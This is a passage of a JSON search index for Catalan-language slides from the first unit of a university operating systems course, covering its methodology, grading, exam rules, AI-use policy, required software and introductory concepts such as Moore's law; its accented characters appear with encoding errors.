    "text": "Metodologia\n\nBasada en Aprenentatge SIGNIFICATIU, GUIAT i ACTIU.\n\n\nSessions te√≤riques: S‚Äôintrodueixen continguts te√≤rics de l‚Äôassignatura i als estudiants, i tamb√© s‚Äôhi discuteixen les implicacions pr√†ctiques.\nSessions pr√†ctiques: sessions autoguiades de laboratori, sessions de live coding o resoluci√≥ de problemes.\nTreball aut√≤nom: els estudiants han d‚Äôaplicar els coneixements adquirits a les sessions te√≤riques i pr√†ctiques per acabar els problemes, laboratoris i projectes proposats. A m√©s, han de realitzar les lectures dels apunts i consultar la bibliografia recomanada.\n\n\nLes sessions te√≤riques i pr√†ctiques estan combinades en les sessions de 3h de durada.\n\n\nLa idea √©s que no us dediqueu nom√©s a memoritzar conceptes, sin√≥ que connecteu la nova informaci√≥ amb el que ja sabeu. Tot i que a la pr√†ctica fareu moltes coses per vosaltres mateixos, jo ser√© aqu√≠ per guiar-vos. Us donar√© les eines, el suport i les indicacions necess√†ries per anar avan√ßant.Volem que sigueu protagonistes del vostre proc√©s d‚Äôaprenentatge. No us limitareu a escoltar-me, sin√≥ que fareu coses, resoldreu problemes i creareu projectes.\n\nSessions te√≤riques: Aqu√≠ introduirem els conceptes clau i els fonaments te√≤rics. Per√≤ no ens quedarem nom√©s amb la teoria; tamb√© discutirem com s‚Äôapliquen aquests conceptes al m√≥n real.\nSessions pr√†ctiques: Farem sessions de laboratori on programareu, farem exercicis de live coding junts per resoldre problemes en directe i practicareu les habilitats que necessiteu.\nTreball aut√≤nom: La major part de l‚Äôaprenentatge real es far√† fora de l‚Äôaula. Us demanar√© que acabeu els laboratoris, resolgueu els exercicis pendents i treballeu en els projectes. Tamb√© ser√† important que reviseu els apunts i, si cal, consulteu la bibliografia recomanada.\n\nLes sessions te√≤riques i pr√†ctiques estaran combinades. La idea √©s que no hi hagi una desconnexi√≥ entre la teoria i la pr√†ctica. Com tenim sessions de 3 hores, podrem dedicar una part a la teoria i l‚Äôaltra a la pr√†ctica, tot integrat en una sola experi√®ncia d‚Äôaprenentatge.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#criteris-davaluaci√≥",
    "href": "slides/01-introduction.html#criteris-davaluaci√≥",
    "title": "Introducci√≥",
    "section": "Criteris d‚ÄôAvaluaci√≥",
    "text": "Criteris d‚ÄôAvaluaci√≥\n\n\n\n\n\n\n\n\n\n\n\nAcr.\nActivitat d‚Äôavaluaci√≥\nPes\nNota m√≠nima\nEn grup\nRecuperable\n\n\n\n\nE1\n1er Parcial\n35%\nNO\nNO\nSI\n\n\nE2\n2on Parcial\n35%\nNO\nNO\nSI\n\n\nP\nPr√†ctiques\n25%\nNO\nSI \\(\\leq 2\\)\nNO\n\n\nPart\nSeguiment i Participaci√≥\n5%\nNO\nNO\nNO\n\n\n\n\nAquesta assignatura s‚Äôavaluara de forma tradicional mitjan√ßant dos ex√†mens parcials (E1 i E2) que representen el 70% de la nota final. A m√©s, hi haur√† pr√†ctiques que contribuiran amb un 25% a la nota final, i un component de seguiment i participaci√≥ que valdr√† un 5%.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#ex√†mens",
    "href": "slides/01-introduction.html#ex√†mens",
    "title": "Introducci√≥",
    "section": "Ex√†mens",
    "text": "Ex√†mens\nEls ex√†mens parcials (E1 i E2) s√≥n proves escrites que avaluen els coneixements te√≤rics i pr√†ctics adquirits durant el curs.\n\nS√≥n proves individuals i presencials.\nEs realitzaran en les dates establertes al calendari acad√®mic.\nNo es permet l‚Äô√∫s de cap dispositiu electr√≤nic (tel√®fons m√≤bils, ordinadors port√†tils o tauletes).\nSi es permet l‚Äô√∫s d‚Äôun resum de continguts, que ha de ser un document escrit a m√† i no pot excedir una fulla DIN A4 (per davant i per darrere).",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#recuperaci√≥",
    "href": "slides/01-introduction.html#recuperaci√≥",
    "title": "Introducci√≥",
    "section": "Recuperaci√≥",
    "text": "Recuperaci√≥\n\nEls parcials s√≥n recuperables mitjan√ßant proves escrites addicionals que es realitzaran durant la setmana de recuperaci√≥.\nSi un estudiant necessita recuperar un √∫nic parcial (E1 o E2), podr√† fer una prova espec√≠fica per a aquest parcial. La qualificaci√≥ obtinguda en aquesta recuperaci√≥ substituir√† la nota del parcial corresponent.\nSi un estudiant necessita recuperar ambd√≥s parcials, haur√† de realitzar dues proves separades, una per a cada parcial (E1 i E2). Les qualificacions obtingudes en cadascuna d‚Äôaquestes proves de recuperaci√≥ substituiran les notes originals dels parcials respectius.\n√âs important notar que no hi haur√† un model d‚Äôexamen unificat per a la recuperaci√≥; cada prova de recuperaci√≥ se centrar√† exclusivament en els continguts del parcial al qual correspon.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#pr√†ctiques",
    "href": "slides/01-introduction.html#pr√†ctiques",
    "title": "Introducci√≥",
    "section": "Pr√†ctiques",
    "text": "Pr√†ctiques\n\nLes pr√†ctiques de l‚Äôassignatura impliquen treball fora de l‚Äôaula i s‚Äôhan de lliurar de forma estricta en les dates establertes.\nLa seva avaluaci√≥ es far√† mitjan√ßant r√∫briques de correcci√≥, que estaran disponibles per als estudiants amb antelaci√≥.\nEl professorat pot entrevistar els estudiants per verificar l‚Äôautoria. Si es detecta que una activitat no ha estat realitzada per l‚Äôestudiant la seva qualificaci√≥ ser√† 0.\nQualsevol entrega fora del termini establert es considerar√† no v√†lida i es qualificar√† amb un 0.\nCadascuna pot tenir una ponderaci√≥ espec√≠fica indicada a la descripci√≥ de l‚Äôactivitat.\nAquestes pr√†ctiques no s√≥n recuperables.\nTot i ser activitats en grup, cada estudiant pot obtenir una nota diferent en funci√≥ de la seva participaci√≥ i aportacions individuals al grup.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#seguiment-i-participaci√≥",
    "href": "slides/01-introduction.html#seguiment-i-participaci√≥",
    "title": "Introducci√≥",
    "section": "Seguiment i Participaci√≥",
    "text": "Seguiment i Participaci√≥\n\n\n\n\n\n\n\nR√∫brica d‚ÄôAvaluaci√≥\n\n\n\n\n\n\n\n\n\n\n\nPunts\nParticipaci√≥ Presencial\nParticipaci√≥ en F√≤rums\nActivitats Sessi√≥\n\n\n\n\n10\nContribucions excepcionals,enriqueix la discussi√≥.\nL√≠der en discussions, promou debat.\nQualitat excepcional, supera expectatives.\n\n\n9\nComentaris rellevants, mostra comprensi√≥, escolta activament.\nRespostes significatives.\nAlta qualitat, treball prec√≠s.\n\n\n8\nContribucions regulars, interactua amb companys.\nPublicacions rellevants, contribueix constructivament.\nCompleix tots requisits amb precisi√≥.\n\n\n7\nParticipa amb una comprensi√≥ b√†sica.\nCompleix m√≠nims, contribucions breus.\nQualitat inconsistent per√≤ acceptable.\n\n\n5-6\nPoca freq√º√®ncia, comentaris superficials.\nPublicacions rares, poc profundes.\nAlgunes activitats incompletes.\n\n\n1-4\nNom√©s participa si se li demana.\nPublicacions irrellevants.\nRarament completa activitats.\n\n\n0\nEvita participar, distret.\nPublicacions fora de tema.\nNo lliura activitats.\n\n\n\n\n\n\n\n\nL‚Äôassist√®ncia passiva no es puntua.\n\n\nAquest component d‚Äôavaluaci√≥ est√† dissenyat per fomentar la participaci√≥ activa i el comprom√≠s amb l‚Äôassignatura. La participaci√≥ no es limita nom√©s a l‚Äôassist√®ncia a classe, sin√≥ que tamb√© inclou la contribuci√≥ en discussions, f√≤rums en l√≠nia i activitats relacionades amb les sessions. Tota participaci√≥ ha de ser rellevant i constructiva per ser valorada positivament. En aquesta r√∫brica, es detallen els criteris espec√≠fics que s‚Äôutilitzaran per avaluar la participaci√≥ dels estudiants en diferents √†mbits.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#bonus-1",
    "href": "slides/01-introduction.html#bonus-1",
    "title": "Introducci√≥",
    "section": "Bonus 1",
    "text": "Bonus 1\n\n\n\nObjectiu: Fomentar la reflexi√≥ i l‚Äôautoavaluaci√≥ dels continguts treballats a classe.\nMetodologia: Cada setmana, els estudiants han de fer un commit al seu repositori d‚Äôapunts amb les notes de les sessions de teoria i pr√†ctiques.\nAvaluaci√≥: Es valorar√† la qualitat de les notes, la seva coher√®ncia i la seva relaci√≥ amb els continguts treballats, aix√≠ com les reflexions i opinions personals incloses.\nPer participar cal crear un repositori a Github (p√∫blic) i fer-me arribar l‚Äôenlla√ß.\n\n\n\n\nExemple de Notes\n## Setmana X\n\n# Resum te√≤ric\n\n# Exemples pr√†ctics\n\n# Dubtes i preguntes\n\n# Reflexions personals\n\n\n\n\n\n\n\nNo es permet cap altre forma\n\n\nLes notes han de ser escrites en format Markdown i mantingudes en un repositori Git i Github.\n\n\n\n\n\n\nAquest bonus est√† dissenyat per incentivar els estudiants a mantenir un registre organitzat i reflexiu dels continguts treballats a classe. En fer un commit setmanal amb les seves notes, els estudiants no nom√©s reforcen el seu aprenentatge, sin√≥ que tamb√© desenvolupen habilitats de documentaci√≥ i autoavaluaci√≥. La qualitat de les notes ser√† clau en l‚Äôavaluaci√≥, ja que es valorar√† no nom√©s la precisi√≥ dels continguts, sin√≥ tamb√© la capacitat de reflexionar sobre el que s‚Äôha apr√®s i com s‚Äôha aplicat aquest coneixement. Es tracta d‚Äôuna oportinitat per als estudiants per crear el seu diari d‚Äôaprenentatge al llarg del curs. Per participar, els estudiants han de crear un repositori p√∫blic a Github i compartir l‚Äôenlla√ß amb el professorat.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#bonus-2",
    "href": "slides/01-introduction.html#bonus-2",
    "title": "Introducci√≥",
    "section": "Bonus 2",
    "text": "Bonus 2\n\n\n\nEls materials s√≥n Open Source.\nQualsevol estudiant pot detectar errors, millorar els materials o afegir continguts nous.\nS‚Äôavaluar√† la quantitat i qualitat.\n\n\n\n\n\nUn altre bonus que oferim √©s la possibilitat de contribuir als materials de l‚Äôassignatura seguint la metodologia de Open Source. Aix√≤ significa que qualsevol estudiant pot detectar errors, suggerir millores o afegir continguts nous als materials proporcionats. Per participar, els estudiants poden fer un fork del repositori de l‚Äôassignatura, treballar en una branca separada i despr√©s obrir una pull request amb les seves propostes de canvi. La quantitat i qualitat de les contribucions seran avaluades, oferint aix√≠ una oportunitat per als estudiants de participar activament en la millora dels recursos educatius.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#gesti√≥-del-curs",
    "href": "slides/01-introduction.html#gesti√≥-del-curs",
    "title": "Introducci√≥",
    "section": "Gesti√≥ del curs",
    "text": "Gesti√≥ del curs\n\nEs demana que els estudiants arribin puntuals a les sessions. L‚Äôentrada tardana pot interrompre la din√†mica de la classe i el treball dels companys.\nEs demana que els estudiants respectin les normes de conviv√®ncia i respecte mutu durant les sessions de classe. Aix√≤ inclou evitar interrupcions innecess√†ries, escoltar activament als companys i al professor, i mantenir un ambient de treball positiu i constructiu.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#comunicaci√≥-amb-el-professorat",
    "href": "slides/01-introduction.html#comunicaci√≥-amb-el-professorat",
    "title": "Introducci√≥",
    "section": "Comunicaci√≥ amb el professorat",
    "text": "Comunicaci√≥ amb el professorat\n\nIntenteu comunicar-vos a trav√©s del correu electr√≤nic i no per l‚Äôeina del campus virtual per assegurar una resposta m√©s r√†pida.\nLes sessions de tutoria es realitzaran de manera presencial o virtual, segons les necessitats dels estudiants. √âs important que els estudiants sol¬∑licitin cita pr√®via per a les tutories utilitzant el correu electr√≤nic jordi.mateo@udl.cat indicant el motiu de la consulta i la disponibilitat hor√†ria i afegint l‚Äôassumpte [SO]: Sol¬∑licitud de Tutoria.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#treball-individual",
    "href": "slides/01-introduction.html#treball-individual",
    "title": "Introducci√≥",
    "section": "Treball individual",
    "text": "Treball individual\n\nCada estudiant √©s responsable de la seva pr√≤pia feina i de com gestiona el seu temps.\nL‚Äôassist√®ncia a classe no √©s obligat√≤ria.\nCada alumne ha de presentar evid√®ncies pr√≤pies del treball realitzat, encara que es col¬∑labori en grup.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#√∫s-de-la-iag",
    "href": "slides/01-introduction.html#√∫s-de-la-iag",
    "title": "Introducci√≥",
    "section": "√ös de la IAG",
    "text": "√ös de la IAG\n\nPots utilitzar eines d‚ÄôIAG per generar idees, entendre conceptes complexos o esbossar l‚Äôestructura inicial del teu codi o projecte. No obstant aix√≤, la implementaci√≥ i la versi√≥ final han de ser sempre de la teva autoria.\nEst√† estrictament prohibit presentar codi o solucions generades directament per una IAG com a treball propi (√©s a dir, mitjan√ßant un simple copiar i enganxar).\nSi incorpores material assistit per una IAG, has de declarar-ho expl√≠citament. Aix√≤ implica identificar clarament les seccions generades per IAG i proporcionar el prompt exacte utilitzat per crear-les.\n\n\nL‚Äôincompliment d‚Äôaquestes directrius es considerar√† una violaci√≥ de la integritat acad√®mica.\n\n\nQualificaci√≥ de zero en la tasca.\nConseq√º√®ncies disciplin√†ries que estableix la Normativa de Conviv√®ncia de la UdL per frau acad√®mic.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#eines-necess√†ries",
    "href": "slides/01-introduction.html#eines-necess√†ries",
    "title": "Introducci√≥",
    "section": "Eines necess√†ries",
    "text": "Eines necess√†ries\n\nOrdinador port√†til amb connexi√≥ a Internet.\n\nEs recomana portar el vostre propi ordinador per cursar l‚Äôassignatura.\nSi no disposeu d‚Äôordinador, podreu utilitzar els ordinadors de la classe durant les sessions de laboratori.\n\nDistribucions Linux (Debian )\n\n√âs obligatori utilitzar la distribuci√≥ Debian per a les pr√†ctiques de laboratori.\n\nSoftware de virtualitzaci√≥ (VMWare)\n\nEs recomana utilitzar VMWare, per√≤ podeu optar per altres opcions de virtualitzaci√≥. Heu de ser capa√ßos d‚Äôadaptar el material al vostre programari de virtualitzaci√≥.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#programari-necessari",
    "href": "slides/01-introduction.html#programari-necessari",
    "title": "Introducci√≥",
    "section": "Programari necessari",
    "text": "Programari necessari\nLlenguatges de programaci√≥ i compiladors\n\nC\nGCC\n\nEines de control de versions\n\nGit\nGithub\n\nIDE\n\nVisual Studio (Recomanat)\nVi, Vim, NeoVim, Emacs, CLion, Eclipse ‚Ä¶",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#materials-i-recursos",
    "href": "slides/01-introduction.html#materials-i-recursos",
    "title": "Introducci√≥",
    "section": "Materials i Recursos",
    "text": "Materials i Recursos\n\nApunts de l‚Äôassignatura i materials proporcionats pel professor.\nDocumentaci√≥ oficial de les eines i tecnologies utilitzades.\nF√≤rums t√®cnics a la xarxa com Stack Overflow, Reddit, etc.\nLlibres de refer√®ncia en Sistemes Operatius:\n\nOperating System Concepts; Abraham Silberschatz\nModern Operating Systems; Andrew S. Tanenbaum",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#bones-pr√†ctiques",
    "href": "slides/01-introduction.html#bones-pr√†ctiques",
    "title": "Introducci√≥",
    "section": "Bones pr√†ctiques",
    "text": "Bones pr√†ctiques\n\nDRY (Do not repeat yourself).\nCodi f√†cil de reutilitzar.\nTesteja aviat, testeja sovint, testeja de forma autom√†tica.\nNo assumeixis res, prova-ho.\nUtilitza assertions per prevenir l‚Äôimpossible.\nUtilitza excepcions per problemes excepcionals.\nEstima l‚Äôordre de complexitat dels teus algorismes.\nUtilitza patrons de disseny.\nUtilitza eines de control de versions.\n\n\nDurant el curs, us animar√© a seguir aquestes bones pr√†ctiques de programaci√≥ per assegurar que el vostre codi sigui net, eficient i f√†cil de mantenir. Aquestes pr√†ctiques no nom√©s us ajudaran a desenvolupar millor programari, sin√≥ que tamb√© us prepararan per treballar en equips de desenvolupament professionals on aquestes normes s√≥n est√†ndard. Es important que el vostre codi sigui f√†cil de llegir i entendre per altres persones, incl√≤s el vostre jo futur!",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#bibliografia-recomanada",
    "href": "slides/01-introduction.html#bibliografia-recomanada",
    "title": "Introducci√≥",
    "section": "Bibliografia recomanada",
    "text": "Bibliografia recomanada\n(per la vida‚Ä¶ no pel curs)\n\n\nThe Pragmatic Programmer, Andrew Hunt David Thomas\n\n\n\n\nUs aconsello molt aquests dos llibres. S√≥n llibres que no nom√©s us ajudaran en aquest curs, sin√≥ que tamb√© us seran √∫tils al llarg de tota la vostra carrera com a desenvolupadors de programari. Aquests llibres ofereixen consells pr√†ctics i principis fonamentals que us ajudaran a escriure codi utiltizant bones pr√†ctiques. S√≥n dos llibres que tot programador hauria de llegir almenys un cop a la vida.\n\nClean Code, (A Handbook of Agile Software Craftsmanship),Robert C. Martin",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#societat-actual",
    "href": "slides/01-introduction.html#societat-actual",
    "title": "Introducci√≥",
    "section": "Societat actual",
    "text": "Societat actual\n\n\nQu√® tenen en com√∫?\n\nCotxe\nRellotge\nPort√†til\nRentadora\nNevera\nTelevisi√≥\n‚Ä¶\n\nVivim en un gran sistema paral¬∑lel i distribu√Øt!\n\n\n\n\n\n\nPer comen√ßar, m‚Äôagradaria que reflexion√©ssiu sobre qu√® tenen en com√∫ tots aquests dispositius que fem servir en el nostre dia a dia. Des de cotxes fins a rellotges, port√†tils, tauletes, rentadores, neveres i televisors, tots aquests aparells semblen molt diferents entre si. Per√≤ si mirem m√©s a fons, veurem que tots compartixen dos caracter√≠stiques fonamentals: tots s√≥n dispositius electr√≤nics que interactuen amb nosaltres i tots estan connectats a internet. Aquesta connexi√≥ a internet √©s el que els permet comunicar-se entre si i amb nosaltres. Aix√≤ ens porta a la seg√ºent reflexi√≥: vivim en un m√≥n on tot est√† interconnectat, podem dir que vivim en un m√≥n distribu√Øt on tots aquests dispositius treballen junts per fer-nos la vida m√©s f√†cil i eficient.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#m√≥n-connectat",
    "href": "slides/01-introduction.html#m√≥n-connectat",
    "title": "Introducci√≥",
    "section": "M√≥n connectat",
    "text": "M√≥n connectat\n\nAvui en dia tothom parla de IoT, BigData, Cloud, AI, Blockchain, Metavers\n\n\n\n\nMicroprocessador a tot arreu.\nXarxes i Connectivitat.\nServeis escalables, confiables i segurs.\nGran volum de dades, Sensor i Digitalitzaci√≥.\n\n\n\n\n\nCasa connectada (Font: Extret de SemanticScholar)\n\n\n\n\nLa barrera que separa el m√≥n f√≠sic i el m√≥n virtual cada cop es mes estreta.\n\n\nEn la societat actual es parla constatant de noves tecnologies disruptives com IoT, BigData, Cloud, AI, Blockchain, Metavers,‚Ä¶ Per tant, com a societat tenim la capacitat d‚Äôinteractuar amb el nostre entorn i ambient. Aix√≤ implica que tenim microprocessadors a tot arreu, disposem de xarxes i connectivitat que ens permeten estar sempre connectats, podem accedir a serveis escalables, confiables i segurs, i gestionem un gran volum de dades gr√†cies a la digitalitzaci√≥ i els sensors.\nAra, pensem un moment en el nostre dia a dia: - Quants teniu un cotxe? Quants processadors creieu que t√© un cotxe? - M√©s de 50! - Qui utilitza un smartphone? Quants processadors/cores t√© el vostre smartphone? - El meu un Poco X4 GT t√© un MediaTek Dimensity 8100 amb 8 nuclis.\nLa capacitat de computaci√≥ est√† present a tot arreu, i la majoria dels dispositius que utilitzem di√†riament estan equipats amb microprocessadors que funcionen de manera paral¬∑lela i interactuen entre ells. Per tant, el m√≥n f√≠sic i el m√≥n virtual estan cada cop m√©s interconnectats, i la barrera que els separa es fa cada cop m√©s estreta.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#qu√®-tenen-en-com√∫-1",
    "href": "slides/01-introduction.html#qu√®-tenen-en-com√∫-1",
    "title": "Introducci√≥",
    "section": "Qu√® tenen en com√∫?",
    "text": "Qu√® tenen en com√∫?\n\nUna interf√≠cie (Sistema Operatiu) capa√ß d‚Äôintegrar una gran diversitat de maquinari i programari i comunicar-se a trav√©s de la xarxa.\n\n\n\n\n\nPer√≤, que tenen en com√∫ aquests progressos tecnol√≤gics? Requereixen un cervell que permeti a tots els diferents aparells i m√†quines interactua amb nosaltres, tant per generar, processar o guardar. Tots els dispositius i servidors requereixen un sistema operatiu que permeti maquinari i programari comunicar-se.\nEn aquest curs tractarem els cervells d‚Äôaquests sistemes i analitzarem de quines estructures podem dotar aquests sistemes perqu√® funcionin correctament i permeti que maquinari tan heterogeni sigui capa√ß de fer funcionar infinitat de programes i serveis per gestionar eficientment les dades i la informaci√≥ del nostre entorn.\nPer tant, a la pregunta inicial qu√® tenen en com√∫? podem afirmar:\n\nTenen en com√∫ que tots s√≥n sistemes inform√†tics.\nTots tenen un sistema operatiu.\nTots es communiquen per internet amb altres sistemes.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#llei-de-bell",
    "href": "slides/01-introduction.html#llei-de-bell",
    "title": "Introducci√≥",
    "section": "Llei de Bell",
    "text": "Llei de Bell\n\n\n\n\nEs pot observar com la mida i les classes de computadors han evolucionat cada 10 anys. Venim de la d√®cada dels anys 60 i 70, on es van desenvolupar els primers microprocessadors i la inform√†tica personal estava en les seves primeres etapes. En aquesta √®poca, es feien servir pocs processadors que eren compartits per moltes persones. Els avan√ßos en la capacitat de processament eren m√©s lents, i la tecnologia era m√©s limitada. Ara, en l‚Äôactualitat, cada persona fa servir molts processadors de manera habitual. Aix√≤ es deu a l‚Äôaugment de la pot√®ncia de processament dels dispositius que utilitzem, com els tel√®fons intel¬∑ligents i les tauletes, aix√≠ com als ordinadors personals i altres tecnologies. Venim de pocs processadors fets servir per a moltes persones (anys 60-70) i ara cada persona fa servir molts processadors. Com ha canviat la tend√®ncia‚Ä¶ on ens portar√† el futur?",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#llei-de-moore",
    "href": "slides/01-introduction.html#llei-de-moore",
    "title": "Introducci√≥",
    "section": "Llei de Moore",
    "text": "Llei de Moore\n\n\n\n\nUs recordeu la llei de Moore? Aquesta llei, formulada per Gordon Moore el 1965, predia que el nombre de transistors en un microprocessador es duplicaria aproximadament cada dos anys, cosa que implicava un augment exponencial de la pot√®ncia de c√†lcul dels ordinadors. Aquesta predicci√≥ s‚Äôha mantingut sorprenentment precisa durant d√®cades, impulsant avan√ßos tecnol√≤gics i transformant la manera com vivim i treballem. No obstant aix√≤, a mesura que ens acostem als l√≠mits f√≠sics de la miniaturitzaci√≥ dels transistors, hi ha un debat continu sobre si aquesta tend√®ncia continuar√† en el futur o si necessitarem noves tecnologies per mantenir el ritme d‚Äôinnovaci√≥.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#qu√®-√©s-un-sistema-inform√†tic",
    "href": "slides/01-introduction.html#qu√®-√©s-un-sistema-inform√†tic",
    "title": "Introducci√≥",
    "section": "Qu√® √©s un sistema inform√†tic?",
    "text": "Qu√® √©s un sistema inform√†tic?\nUn sistema inform√†tic √©s la interconnexi√≥ d‚Äôelements de maquinari per exemple d‚Äô1 o m√©s CPU, mem√≤ria i components E/S ‚Ä¶ Amb la finalitat d‚Äôexecutar programes i accions (en s√®rie o de forma concurrent) per 1 o m√∫ltiples usuaris.\n\n\n\n\n\n\n\nSi us recordeu d‚ÄôEstructura de Computadors, un sistema inform√†tic √©s la interconnexi√≥ d‚Äôelements de maquinari com ara una o m√©s CPU, mem√≤ria i components d‚Äôentrada/sortida. Tenim els registres, la mem√≤ria cau, la mem√≤ria principal, els dispositius d‚Äôentrada/sortida i els canals de comunicaci√≥ que permeten que tots aquests components treballin junts per executar programes i accions.\nCom heu vist el mon real actua com un gran sistema paral¬∑lel. Per tant, tots els sistemes de temps real son inherentment concurrents i l√≤gicament els nostres sisteme inform√†tics tamb√© han de poder actuar en paral¬∑lel. En la figura, podeu observar com una tasca es descomposa en diferents parts per poder aprofitar els diferents processadors i nuclis de cada processador.L‚Äôexecuci√≥ concurrent recull un conjunt de t√®cniques inform√†tiques usades per representar i gestionar el paral¬∑lelisme i les eines de sincronitzaci√≥ i comunicaci√≥ entre programes.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#gesti√≥-dun-sistema-inform√†tic-i",
    "href": "slides/01-introduction.html#gesti√≥-dun-sistema-inform√†tic-i",
    "title": "Introducci√≥",
    "section": "Gesti√≥ d‚Äôun sistema inform√†tic (I)",
    "text": "Gesti√≥ d‚Äôun sistema inform√†tic (I)\n\nImagineu que sou un sistema inform√†tic i us envien l‚Äôordre de llegir un fitxer\n\n\nQuin √©s el procediment per fer aquesta acci√≥?\n\nEngegar motor del disc.\nBuscar posici√≥ al disc a llegir (pista, cara, sector).\nLlegir.\nApagar el motor.\n\nQuantes vegades com a usuaris d‚Äôun sistema inform√†tic llegiu un fitxer?\n\n\nMoltes vegades‚Ä¶!\n\n\nCom a usuaris d‚Äôun sistema inform√†tic llegim fitxers moltes vegades al dia. Per exemple, quan obrim un document de text, una imatge, un v√≠deo o qualsevol altre tipus d‚Äôarxiu, el sistema operatiu ha de llegir aquest fitxer des del disc dur o una altra unitat d‚Äôemmagatzematge. Per√≤, us heu preguntat alguna vegada quin √©s el procediment que segueix el sistema inform√†tic per llegir aquest fitxer? Hauriam d‚Äôengegar el motor del disc, buscar la posici√≥ correcta al disc on es troba el fitxer, llegir les dades i finalment apagar el motor. T√© sentit que un usuari cada cop que llegeix un fitxer hagi de tenir en compte aquest procediment i realitzar-lo de forma rutin√†ria? Necessitem un programari que ens permeti efectuar accions rutin√†ries de forma autom√†tica i transparent a l‚Äôusuari. Si no els sistemes inform√†tics no serien usables.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#complexitat-sistemes-inform√†tics-i",
    "href": "slides/01-introduction.html#complexitat-sistemes-inform√†tics-i",
    "title": "Introducci√≥",
    "section": "Complexitat sistemes inform√†tics (I)",
    "text": "Complexitat sistemes inform√†tics (I)\n\nCada pe√ßa de hardware √©s diferent. \\(\\Rightarrow\\) La complexitat per gestionar els recursos √©s molt elevada.\n\n\nArquitectures diferents de processadors i tamb√© de generacions (x86, ARM, RISC-V, MIPS, PowerPC,‚Ä¶).\nDiferents tipus de mem√≤ries (RAM DDR3, DDR4, DDR5, NAND,‚Ä¶).\nDiferents tipus de discs (HDD, SSD, NVM‚Ä¶).\nDiferents dispositius entrada/sortida.\nDiferents entorns de xarxa.\n\n\n‚Ä¶ entre moltes altres ‚Ä¶\n\n\nUs imagineu haver d‚Äôescriure software per cada permutaci√≥ d‚Äôelements diferents del sistema inform√†tic? Aix√≤ seria un desastre‚Ä¶ Quantes permutacions de diferents components podem tenir avui en dia? OMG! Necessitem alguna cosa que ens permeti superar aquest obstacle de forma intel¬∑ligent i ens permeti desenvolupar software de forma independent al hardware.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#complexitat-sistemes-inform√†tics-iii",
    "href": "slides/01-introduction.html#complexitat-sistemes-inform√†tics-iii",
    "title": "Introducci√≥",
    "section": "Complexitat sistemes inform√†tics (III)",
